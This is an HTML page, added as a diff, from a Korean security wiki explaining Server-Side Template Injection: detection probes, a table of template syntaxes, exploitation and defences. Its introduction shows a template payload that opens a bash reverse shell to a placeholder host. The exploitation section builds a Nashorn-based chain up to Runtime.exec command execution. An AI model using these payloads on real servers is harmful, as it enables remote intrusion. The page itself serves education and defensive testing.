@@ -1,0 +1,595 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="color-scheme" content="dark">
+    <meta name="theme-color" content="#040405">
+
+    
+    <title>SSTI Attack | HAHWUL</title>
+
+    
+    
+        <meta name="description" content="Server-Side Template Injection">
+    
+
+    
+    <meta property="og:title" content="SSTI Attack">
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/cullinan/attack/ssti/">
+  <meta property="og:description" content="Server-Side Template Injection">
+  <meta property="og:image" content="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/og.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="SSTI Attack">
+  <meta name="twitter:description" content="Server-Side Template Injection">
+  <meta name="twitter:image" content="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/og.png">
+    <meta property="og:site_name" content="PIXN">
+    <meta property="og:locale" content="en_US">
+
+    
+    <link rel="canonical" href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/cullinan/attack/ssti/">
+    
+
+    
+    <link rel="alternate" type="application/rss+xml" title="HAHWUL" href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/rss.xml">
+    
+
+    
+    <link rel="icon" type="image/png" href="/favicon.svg" sizes="96x96" />
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
+    <link rel="shortcut icon" href="/favicon.svg" />
+    <link rel="apple-touch-icon" sizes="180x180" href="/favicon.svg" />
+    <meta name="apple-mobile-web-app-title" content="PIXN" />
+    <link rel="manifest" href="/icons/site.webmanifest" />
+
+    
+    <link rel="preload" as="image" href="/images/pixn-mark.svg">
+
+    
+    <link rel="stylesheet" href="/fonts/pretendard/pretendardvariable-dynamic-subset.css">
+
+    
+    <link rel="stylesheet" href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/assets/main.8885b746.css">
+
+    
+    <link rel="stylesheet" href="/assets/css/highlight/atom-one-dark.min.css?v=f44d507f">
+
+    
+    <script type="application/ld+json">{"@context":"https://schema.org","@type":"Article","headline":"SSTI Attack","url":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/cullinan/attack/ssti/","datePublished":"2021-11-22T00:00:00+00:00","dateModified":"2023-05-07T00:00:00+00:00","description":"Server-Side Template Injection","image":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/og-images/cullinan-attack-ssti.png"}</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"HAHWUL","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/"},{"@type":"ListItem","position":2,"name":"Archive","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/archive/"},{"@type":"ListItem","position":3,"name":"Cullinan","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/cullinan/"},{"@type":"ListItem","position":4,"name":"Untitled","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/cullinan/attack/"},{"@type":"ListItem","position":5,"name":"SSTI Attack"}]}</script>
+    <script type="application/ld+json">{"@context":"https://schema.org","@type":"WebSite","name":"HAHWUL","url":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/","description":"Offensive Security Engineer, Developer and H4cker.","potentialAction":{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/?q={search_term_string}"},"query-input":"required name=search_term_string"}}</script>
+</head>
+
+<body>
+    <a class="skip-link sr-only" href="#main-content">Skip to content</a>
+    <div class="site-wrapper">
+        <header class="site-header">
+            <div class="header-content">
+                <nav class="main-nav">
+    <div class="nav-logo">
+        <a href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/" aria-label="PIXN, home">
+            <span class="hw-mark" aria-hidden="true"></span>
+            <span class="nav-wordmark" aria-hidden="true">PIXN</span>
+        </a>
+    </div>
+
+    <button class="nav-toggle" aria-label="Toggle navigation" aria-expanded="false" aria-controls="nav-menu">
+        <span></span>
+        <span></span>
+        <span></span>
+    </button>
+
+    <div class="nav-overlay"></div>
+
+    <div class="nav-menu" id="nav-menu">
+        <a href="/posts/">Posts</a>
+        <a href="/notes/">Notes</a>
+        <a href="/projects/">Projects</a>
+        <a href="/about/">About</a>
+    </div>
+
+    <button class="nav-search" type="button" data-search-trigger aria-label="Open search">
+        <span class="nav-search-key" data-search-key aria-hidden="true">⌘K</span>
+    </button>
+</nav>
+
+<script>
+(function() {
+    const navToggle = document.querySelector('.nav-toggle');
+    const navMenu = document.querySelector('.nav-menu');
+    const navOverlay = document.querySelector('.nav-overlay');
+    const body = document.body;
+
+    function openMenu() {
+        navToggle.setAttribute('aria-expanded', 'true');
+        navToggle.classList.add('active');
+        navMenu.classList.add('active');
+        navOverlay.classList.add('active');
+        body.classList.add('nav-open');
+    }
+
+    function closeMenu() {
+        navToggle.setAttribute('aria-expanded', 'false');
+        navToggle.classList.remove('active');
+        navMenu.classList.remove('active');
+        navOverlay.classList.remove('active');
+        body.classList.remove('nav-open');
+    }
+
+    if (navToggle && navMenu) {
+        navToggle.addEventListener('click', function() {
+            const isExpanded = navToggle.getAttribute('aria-expanded') === 'true';
+            if (isExpanded) {
+                closeMenu();
+            } else {
+                openMenu();
+            }
+        });
+
+        // Close menu when clicking overlay
+        if (navOverlay) {
+            navOverlay.addEventListener('click', closeMenu);
+        }
+
+        // Close menu when clicking a link
+        navMenu.querySelectorAll('a').forEach(function(link) {
+            link.addEventListener('click', closeMenu);
+        });
+
+        // Close menu on escape key
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                closeMenu();
+            }
+        });
+    }
+})();
+</script>
+            </div>
+        </header>
+
+        <main id="main-content">
+            <div class="container">
+                
+
+<div class="post-wrapper">
+    <article class="post-content">
+        <header class="page-header">
+            <h1 class="page-title">SSTI Attack</h1>
+            <div class="post-meta-section">
+                <div class="post-meta">
+                    
+                    <time class="meta-item" datetime="2021-11-22">
+                        NOVEMBER 22, 2021
+                    </time>
+                     
+                </div>
+            </div>
+
+            
+            <p class="page-description">Server-Side Template Injection</p>
+            
+        </header>
+
+        <div class="post-body"><h2 id="introduction">Introduction</h2>
+<p>SSTI(Server-Side Template Injection)은 공격자가 Template 코드를 기존 template에 include 시켜서 원하는 액션을 수행하도록 하는 공격입니다. 이 때 template injection이 발생하는 위치가 server-side인 경우 SSTI라고 부릅니다.</p>
+<p>SSTI가 발생하는 경우 Server-Side의 렌더링에 관여할 수 있기 때문에 단순하게는 Client-Side의 취약점들(XSS,CSRF 등) 뿐만 아니라 Server-Side의 취약점들(RCE,SSRF)로도 연결할 수 있어서 리스크가 높습니다.</p>
+<pre><code class="language-java hljs"><span class="hljs-punctuation">{</span><span class="hljs-punctuation">{</span> config<span class="hljs-operator">[</span>&#39;RUNCMD&#39;<span class="hljs-operator">]</span><span class="hljs-punctuation">(</span>&#39;<span class="hljs-operator">/</span>bin<span class="hljs-operator">/</span>bash <span class="hljs-operator">-</span>c <span class="hljs-string">&quot;</span><span class="hljs-string">/bin/bash -i &gt;&amp; /dev/tcp/x.x.x.x/8000 0&gt;&amp;1</span><span class="hljs-string">&quot;</span>&#39;<span class="hljs-punctuation">,</span>shell<span class="hljs-operator">=</span>True<span class="hljs-punctuation">)</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">}</span>
+</code></pre>
+<h2 id="offensive-techniques">Offensive techniques</h2>
+<h3 id="detect">Detect</h3>
+<p>Server-Side Template Engine은 언어, 프레임워크 등에 따라 굉장히 종류가 많습니다. 이에 따라서 Template 문법이 다르기 때문에 백엔드 시스템에 대한 정보가 없다면 여러 가지 Template 문법을 삽입하여 Return 되는 결과를 체크해야 합니다.</p>
+<p>일반적으로 숫자 계산을 통해 체크하는 형태를 많이 사용합니다.</p>
+<pre><code>GET /test?q=abcd${412*343}efgh HTTP/1.1
+</code></pre>
+<p><strong>미취약</strong></p>
+<pre><code>abcd${412*343}efgh
+</code></pre>
+<p><strong>취약</strong></p>
+<pre><code>abcd141316efgh
+</code></pre>
+<p>다만 케이스가 굉장히 많기 때문에 보통 Ployglot payload나 Fuzzing을 통해 테스트합니다.  Template 문법 별 언어 패턴은 아래와 같습니다.</p>
+<pre><code>@( )
+- ASP.NET Razor
+
+#{ }
+- Expression Language
+- Freemarker
+- Ruby (Slim)
+- Jade
+- Codepen
+
+${ }
+- Expression Language (+JavaEL)
+- Freemarker
+- Java
+
+{{ }}
+- Java
+- Jinja
+- Jinjava
+- Pebble
+- Twig
+- Handlebars
+
+[[ ]]
+- Jinja2
+
+{1+2}
+- Smarty
+
+&lt;%= %&gt; or &lt;% %&gt;
+- Ruby (ERB)
+- Mako
+
+#
+- Velocity (e.g: #set)
+
+@
+- Lessjs (css 문법으로 대부분 사용 가능합니다. e.g: @import / @plugin)
+</code></pre>
+<p>이외에도 여기 나열되지 않은 Template engine에서 사용하는 문법이 존재할 수 있기 때문에 아래와 같이 Template 으로 사용될 수 있는 expression 들은 테스트해보시는 것을 추천드립니다.</p>
+<pre><code class="language-javascript hljs"><span class="hljs-punctuation">{</span><span class="hljs-keyword">var</span><span class="hljs-punctuation">}</span> $<span class="hljs-punctuation">{</span><span class="hljs-keyword">var</span><span class="hljs-punctuation">}</span> <span class="hljs-punctuation">{</span><span class="hljs-punctuation">{</span><span class="hljs-keyword">var</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">}</span> <span class="hljs-operator">&lt;</span><span class="hljs-operator">%</span><span class="hljs-keyword">var</span><span class="hljs-operator">%</span><span class="hljs-operator">&gt;</span> <span class="hljs-punctuation">[</span><span class="hljs-operator">%</span> <span class="hljs-keyword">var</span> <span class="hljs-operator">%</span><span class="hljs-punctuation">]</span>
+</code></pre>
+<h3 id="exploitation">Exploitation</h3>
+<h4 id="payloads">Payloads</h4>
+<p>SSTI는 Server-Side Rendering에 관여할 수 있기 때문에 Server-Side 기반의 Exploiting 과정을 사용할 수 있습니다. 보편적으로 RCE(Code Execution), SSRF, 그리고 시스템 파일을 읽는 형태로 Payload를 구성할 수 있습니다.</p>
+<p>페이로드 종류도 워낙 많고 추가/변동되는 경우도 있어서 제가 관리하는 것보단 아래 링크들을 참고하시는게 좋을 것 같습니다.</p>
+<ul>
+<li>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection</li>
+<li>https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssti.txt</li>
+</ul>
+<p>그리고 이러한 부분은 Injection 포인트를 찾았다면 도구들을 이용해서 테스트하시는 것을 추천드려요. (SQLi 같이 테스트를 위해선 쿼리가 많이 필요하기 때문이죠)</p>
+<h4 id="ssti-to-rce">SSTI to RCE</h4>
+<p>SSTI에 성공했다고 모두 RCE가 가능한 것은 아닙니다. 해당 Application 에서 사용할 수 있는 Object 따라서, 또는 보호 로직이 있는 경우 일반적으로 알려진 코드를 실행할 수 없기 때문에 SSTI를 탐지했다면 Exploit 하기 위한 추가 테스팅 과정이 필요합니다.</p>
+<p>간단한 방법으론 반복적으로 요청을 보내보면서 Template 문법이 처리되는 Object를 찾고, 이를 기반으로 공격코드를 만드는 형태로 RCE까지 발전시킬 수 있습니다. <code>getClass</code> <code>forName</code>과 Array 등을 이용하여 사용 가능한 Object를 탐색합니다.</p>
+<p>예를들어 nashorn 엔진을 쓸 수 있는지 체크하려면 아래와 같이 순차적으로 확장하면서 허용 가능한 부분이 어디까지인지 체크하면 됩니다.</p>
+<pre><code class="language-java hljs">$<span class="hljs-punctuation">{</span><span class="hljs-number">4</span><span class="hljs-operator">*</span><span class="hljs-number">4</span><span class="hljs-punctuation">}</span>
+$<span class="hljs-punctuation">{</span>&#39;&#39;<span class="hljs-punctuation">.</span><span class="hljs-attr">getClass</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">}</span>
+$<span class="hljs-punctuation">{</span>&#39;&#39;<span class="hljs-punctuation">.</span><span class="hljs-attr">getClass</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">.</span><span class="hljs-attr">forName</span><span class="hljs-punctuation">(</span>&#39;javax<span class="hljs-punctuation">.</span><span class="hljs-attr">script</span><span class="hljs-punctuation">.</span><span class="hljs-attr">ScriptEngineManager</span>&#39;<span class="hljs-punctuation">)</span><span class="hljs-punctuation">}</span>
+$<span class="hljs-punctuation">{</span>&#39;&#39;<span class="hljs-punctuation">.</span><span class="hljs-attr">getClass</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">.</span><span class="hljs-attr">forName</span><span class="hljs-punctuation">(</span>&#39;javax<span class="hljs-punctuation">.</span><span class="hljs-attr">script</span><span class="hljs-punctuation">.</span><span class="hljs-attr">ScriptEngineManager</span>&#39;<span class="hljs-punctuation">)</span><span class="hljs-punctuation">.</span><span class="hljs-attr">newInstance</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">}</span>
+$<span class="hljs-punctuation">{</span>&#39;&#39;<span class="hljs-punctuation">.</span><span class="hljs-attr">getClass</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">.</span><span class="hljs-attr">forName</span><span class="hljs-punctuation">(</span>&#39;javax<span class="hljs-punctuation">.</span><span class="hljs-attr">script</span><span class="hljs-punctuation">.</span><span class="hljs-attr">ScriptEngineManager</span>&#39;<span class="hljs-punctuation">)</span><span class="hljs-punctuation">.</span><span class="hljs-attr">newInstance</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">.</span><span class="hljs-attr">getEngineByName</span><span class="hljs-punctuation">(</span>&#39;js&#39;<span class="hljs-punctuation">)</span><span class="hljs-punctuation">}</span>
+</code></pre>
+<p>각각 코드에 따른 object나 function, class 등이 리턴되며 마지막 라인까지 확인하면 아래와 같이 NashornScriptEngine을 쓸 수 있는 것을 확인할 수 있습니다.</p>
+<pre><code>jdk.nashorn.api.scripting.NashornScriptEngine@d314a00
+</code></pre>
+<p>이제 이를 기반(nashorn 문법)으로 코드를 작성하면 SSTI를 통해 서버에서 명령을 실행할 수 있습니다.</p>
+<pre><code class="language-java hljs">$<span class="hljs-punctuation">{</span>&#39;&#39;<span class="hljs-punctuation">.</span><span class="hljs-attr">getClass</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">.</span><span class="hljs-attr">forName</span><span class="hljs-punctuation">(</span>&#39;javax<span class="hljs-punctuation">.</span><span class="hljs-attr">script</span><span class="hljs-punctuation">.</span><span class="hljs-attr">ScriptEngineManager</span>&#39;<span class="hljs-punctuation">)</span><span class="hljs-punctuation">.</span><span class="hljs-attr">newInstance</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">.</span><span class="hljs-attr">getEngineByName</span><span class="hljs-punctuation">(</span>&#39;js&#39;<span class="hljs-punctuation">)</span><span class="hljs-punctuation">.</span><span class="hljs-attr">eval</span><span class="hljs-punctuation">(</span>&#39;java<span class="hljs-punctuation">.</span><span class="hljs-attr">lang</span><span class="hljs-punctuation">.</span><span class="hljs-attr">Runtime</span><span class="hljs-punctuation">.</span><span class="hljs-attr">getRuntime</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">.</span><span class="hljs-attr">exec</span><span class="hljs-punctuation">(</span><span class="hljs-string">&quot;</span><span class="hljs-string">ifconfig</span><span class="hljs-string">&quot;</span><span class="hljs-punctuation">)</span>&#39;<span class="hljs-punctuation">)</span><span class="hljs-punctuation">}</span>
+</code></pre>
+<h2 id="defensive-techniques">Defensive techniques</h2>
+<p>SSTI는 대다수 Injection 공격과 동일하게 Sanitization, Sandboxing, Input validation을 다중으로 적용하는 것이 가장 좋은 형태의 대응방안이고 어려운 경우 한가지의 대응을 꼼꼼하게 처리하는 방식으로 완화가 가능합니다. 또한 Injection 계통 처리 시 Input Type을 명시(e.g page 파라미터는 int 값만 받도록 처리)하는 형태와 같이 딱 필요한 목적의 데이터만 사용될 수 있도록 제한하는 형태도 좋은 대응방안 중 하나입니다. (아래 내용 중 Logic-less에 해당)</p>
+<h3 id="logic-less">Logic-Less</h3>
+<p>Template을 사용 시 Logic에 대한 처리가 필요하지 않는다면 Logic-less template 사용으로 쉽게 SSTI를 방지할 수 있습니다. 대표적으로 Jekyll에서 사용되는 Liquid나 Handlebars, Mustache 등이 있습니다.</p>
+<h3 id="sanitization">Sanitization</h3>
+<p>사용자 입력으로 부터 Template을 생성하지 않도록 처리해야합니다. 사용자 입력이 필요한 경우 Template 자체에서 제공하는 Parameter를 통해 받아 처리하도록 구성하여 Template 자체에 영향을 줄 수 없도록 제한해야 합니다.</p>
+<h3 id="input-validation">Input Validation</h3>
+<p>마지막으로 사용자 입력에서 { } [ ] 과 같은 특수문자 자체를 받지 못하도록 Escape 처리하는 로직을 적용하여 대응할 수 있습니다. 이는 일부 XSS, SQLi에서 대응하는 방식과 동일합니다.</p>
+<pre><code>{ }
+[ ]
+&lt; &gt;
+%
+#
+@
+
+등
+</code></pre>
+<h3 id="sandboxing">Sandboxing</h3>
+<p>사용자 입력 값을 기반으로 Template을 생성하고 렌더링해야 하는 경우 어쩔 수 없이 사용자 입력으로 Template을 처리할 수 밖에 없습니다. 이 때 사용자 입력으로 부터 받는 Template은 Sandboxing 하여 공격코드가 실제로 영향을 끼칠 수 없도록 제한하는 방법으로도 대응할 수 있습니다.</p>
+<p>다만 Sandboxing의 경우 우회할 여지가 충분히 있기 때문에 가급적 단독으로 사용하는 것 보단 위 2개와 혼용하여 사용하는 것을 추천드립니다.</p>
+<h2 id="tools">Tools</h2>
+<ul>
+<li>https://github.com/epinna/tplmap</li>
+<li><a href="https://github.com/PortSwigger/backslash-powered-scanner">backslash scanner in Burpsuite</a></li>
+<li><a href="https://www.zaproxy.org/docs/desktop/addons/active-scan-rules-alpha/#server-side-template-injection">ActiveScan Alpha Rule in ZAP #SSTI</a></li>
+<li><a href="https://www.zaproxy.org/docs/desktop/addons/active-scan-rules-alpha/#server-side-template-injection-blind">ActiveScan Alpha Rule in ZAP #SSTI-Blind</a></li>
+<li><a href="https://www.zaproxy.org/docs/alerts/90025/">Active rule 90025 in ZAP</a></li>
+<li>SSTI-BAV in <a href="https://github.com/hahwul/dalfox">dalfox</a></li>
+</ul>
+<h2 id="articles">Articles</h2>
+<ul>
+<li><a href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/2018/08/25/spel-injection-springboot-rce/">https://pixn-analytics-portfolio.forhm0220.chatgpt.site/2018/08/25/spel-injection-springboot-rce/</a></li>
+<li><a href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/2020/06/15/email-exploiting-technic/#payloads">https://pixn-analytics-portfolio.forhm0220.chatgpt.site/2020/06/15/email-exploiting-technic/#payloads</a></li>
+<li>https://pixn-analytics-portfolio.forhm0220.chatgpt.site/cullinan/el-injection/</li>
+<li>https://pixn-analytics-portfolio.forhm0220.chatgpt.site/cullinan/ognl-injection/</li>
+</ul>
+<h2 id="references">References</h2>
+<ul>
+<li>https://portswigger.net/web-security/server-side-template-injection</li>
+<li>https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection</li>
+<li>https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssti.txt</li>
+</ul>
+</div>
+
+        <div class="footnotes-area"></div>
+
+        
+            
+            
+                
+                
+                
+                
+                
+                
+                
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+        <nav class="post-navigation" aria-label="Post navigation">
+            
+                
+                
+                
+                
+            <a href="/cullinan/attack/web-cache-deception/" class="nav-prev" rel="prev">
+                <span class="nav-label">← Previous</span>
+                <span class="nav-title">Web Cache Deception</span>
+            </a>
+            
+
+            
+                
+                
+                
+                
+            <a href="/cullinan/attack/dependency-confusion/" class="nav-next" rel="next">
+                <span class="nav-label">Next →</span>
+                <span class="nav-title">Dependency Confusion</span>
+            </a>
+            
+        </nav>
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+    </article>
+
+    
+</div>
+
+            </div>
+        </main>
+
+        <footer class="site-footer">
+    <div class="container">
+        <div class="footer-content">
+            <span class="hw-mark footer-mark" aria-hidden="true"></span>
+            <nav class="footer-menu" aria-label="Footer">
+                <a href="/tags/">TAGS</a>
+                <a href="/about/uses/">USES</a>
+                <a href="/contact/">CONTACT</a>
+                <a href="/feeds/">FEEDS</a>
+                <a href="/privacy/">PRIVACY</a>
+            </nav>
+            <div class="socials">
+                <a
+                    href="https://github.com/hahwul"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    title="GitHub"
+                    aria-label="GitHub"
+                    ><svg
+                        aria-hidden="true"
+                        fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 24 24"
+                    >
+                        <path
+                            d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"
+                        /></svg
+                ></a>
+                <a
+                    href="https://x.com/hahwul"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    title="X"
+                    aria-label="X (Twitter)"
+                    ><svg
+                        aria-hidden="true"
+                        fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 24 24"
+                    >
+                        <path
+                            d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"
+                        /></svg
+                ></a>
+                <a
+                    href="https://www.instagram.com/hahwul_"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    title="Instagram"
+                    aria-label="Instagram"
+                    ><svg
+                        aria-hidden="true"
+                        fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 24 24"
+                    >
+                        <path
+                            d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"
+                        /></svg
+                ></a>
+            </div>
+            <p>Developed and Designed by Me<br />2026 HAHWUL.</p>
+        </div>
+    </div>
+</footer>
+        <div
+    class="search-overlay"
+    data-search-overlay
+    data-search-index="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/search_index.json"
+    data-search-empty="Type to search posts, notes, projects and the archive."
+    data-search-no-results="No results found."
+    data-search-loading="Loading index"
+    data-search-error="Unable to load search index. Refresh and try again."
+    aria-hidden="true"
+>
+    <div class="search-panel" role="dialog" aria-modal="true" aria-label="Search">
+        <div class="search-header">
+            <div class="search-input-wrapper">
+                <input
+                    type="search"
+                    name="search"
+                    placeholder="Search the site, #tag to filter"
+                    aria-label="Search the site"
+                    autocomplete="off"
+                    spellcheck="false"
+                    data-search-input
+                >
+            </div>
+            <div class="search-meta">
+                <span class="search-shortcut" data-search-key>⌘K</span>
+                <button class="search-close" type="button" data-search-close aria-label="Close search">
+                    Esc
+                </button>
+            </div>
+        </div>
+        <div class="search-filters" data-search-filters>
+            <div class="search-filter-group" role="group" aria-label="Filter by type" data-filter-group="type">
+                <button type="button" class="search-chip is-active" data-filter-type="all" aria-pressed="true">All<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="post" aria-pressed="false">Posts<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="note" aria-pressed="false">Notes<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="project" aria-pressed="false">Projects<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="archive" aria-pressed="false">Archive<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="page" aria-pressed="false">Pages<span class="search-chip-count" data-chip-count></span></button>
+            </div>
+            <div class="search-filter-group search-filter-group--lang" role="group" aria-label="Filter by language" data-filter-group="lang">
+                <button type="button" class="search-chip is-active" data-filter-lang="all" aria-pressed="true">All</button>
+                <button type="button" class="search-chip" data-filter-lang="en" aria-pressed="false">EN</button>
+                <button type="button" class="search-chip" data-filter-lang="ko" aria-pressed="false">KO</button>
+            </div>
+        </div>
+        <div class="search-status" data-search-status></div>
+        <div class="search-results" data-search-results aria-live="polite">
+            <p class="search-empty" data-search-empty>Type to search posts, notes, projects and the archive.</p>
+        </div>
+    </div>
+</div>
+    </div>
+
+    
+    
+
+    
+    <script src="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/assets/app.1881a2e0.js" defer></script>
+</body>
+
+</html>
